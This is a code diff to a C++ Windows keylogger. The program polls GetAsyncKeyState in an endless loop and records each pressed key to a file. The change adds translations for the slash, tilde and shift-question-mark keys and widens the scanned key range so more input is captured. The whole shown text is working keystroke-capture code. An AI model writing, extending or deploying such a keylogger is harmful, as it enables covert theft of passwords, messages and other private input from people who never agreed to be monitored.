@@ -41,6 +41,11 @@ std::string specialKey(int keyPressed) {
     //Alt
     } else if(keyPressed == VK_MENU) {
         translatedKey = "[ALT]";
+    // Forward Slash
+    } else if(keyPressed == 0xBF) {
+        translatedKey = "/";
+    } else if(keyPressed == 0xC0) {
+        translatedKey = "~";
     };
 
     return translatedKey;
@@ -53,7 +58,7 @@ int main() {
     while(true){
         //Loop through each key using Virtual-Key Codes.
         //Start at 8 and go to 190 since the rest of the key codes can vary
-        for(int keyCode=8; keyCode<=190; keyCode++) {
+        for(int keyCode=8; keyCode<=226; keyCode++) {
             //Check if the key is pressed
             //-32767 specifically so it checks if the least significant bit is set, indicating key was pressed after the call.
             if(GetAsyncKeyState(keyCode) == -32767) {
@@ -67,8 +72,12 @@ int main() {
                     } else {
                         fileData(std::string(1, std::tolower(char(keyCode))));
                     }
-                   
                 } else {
+                    if(GetAsyncKeyState(VK_SHIFT)) {
+                        if(res == "/") {
+                            res = "?";
+                        }
+                    }
                     fileData(res);
                 } 
             }
